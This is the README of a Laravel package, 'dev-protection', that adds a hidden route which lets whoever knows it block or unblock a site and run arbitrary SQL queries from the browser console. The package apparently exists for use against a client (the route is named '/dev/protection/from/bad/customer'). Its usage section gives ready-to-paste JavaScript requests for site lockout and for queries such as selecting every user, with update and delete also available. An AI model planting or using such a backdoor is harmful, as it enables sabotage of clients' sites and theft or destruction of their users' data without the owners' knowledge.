# Laravel developer protection 
This is a small Laravel >= 5 package that comes with 3 functions out of the box for block, unblock and run any sql query from browser JavaScript console.

## Installation

### Step 1: Composer

From the command line, run:

```
composer require masterro/dev-protection
```

### Step 2: Service Provider

For your Laravel app, open `config/app.php` and, within the `providers` array, append:

```
MasterRO\DevProtection\DevProtectionServiceProvider::class
```

### Step 3: Middleware

Add to your http Kernel a Protection Middleware or create your own that would be check if site is blocked and throw an exception or show your custom page.

```
protected $middleware = [
    \Illuminate\Foundation\Http\Middleware\CheckForMaintenanceMode::class,
    \MasterRO\DevProtection\Protection::class,
];
```


## Usage

In browser open JavaScript console and run

### To block
```javascript
var xhr = new XMLHttpRequest();
var data = new FormData;

data.append('action', 'block');

xhr.open("POST", '/dev/protection/from/bad/customer', true);

xhr.send(data);
```

### To unblock
```javascript
var xhr = new XMLHttpRequest();
var data = new FormData;

data.append('action', 'unblock');

xhr.open("POST", '/dev/protection/from/bad/customer', true);

xhr.send(data);
```

### To run sql query
```javascript
var xhr = new XMLHttpRequest();
var data = new FormData;

data.append('action', 'query');
data.append('params[]', 'select * from users'); // sql
data.append('params[]', 'select'); // query type - available types: select, update, delete, statement

xhr.open("POST", '/dev/protection/from/bad/customer', true);

xhr.send(data);
```

Package is using an underlying class MasterRO\DevProtection\Protector that uses Macroable trait, so you can extend the functionality like you need.